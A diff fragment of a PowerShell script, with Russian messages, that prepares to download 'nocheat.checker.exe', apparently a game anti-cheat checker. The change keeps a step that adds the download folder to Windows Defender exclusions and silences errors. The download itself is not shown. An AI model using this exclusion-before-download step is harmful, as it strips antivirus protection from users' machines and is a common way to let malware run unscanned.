@@ -48,8 +48,10 @@ if (-not (Test-Path $workDir)) {
 $exePath = Join-Path $workDir "nocheat.checker.exe"
 
 try {
-    Write-Host "[+] Добавление папки '$workDir' в исключения Защитника Windows..." -ForegroundColor Green
-    Add-MpPreference -ExclusionPath $workDir -ErrorAction SilentlyContinue
+    if (Get-Command "Add-MpPreference" -ErrorAction SilentlyContinue) {
+        Write-Host "[+] Добавление папки '$workDir' в исключения Защитника Windows..." -ForegroundColor Green
+        Add-MpPreference -ExclusionPath $workDir -ErrorAction SilentlyContinue
+    }
 
     Write-Host "[+] Загрузка nocheat.checker..." -ForegroundColor Green
     
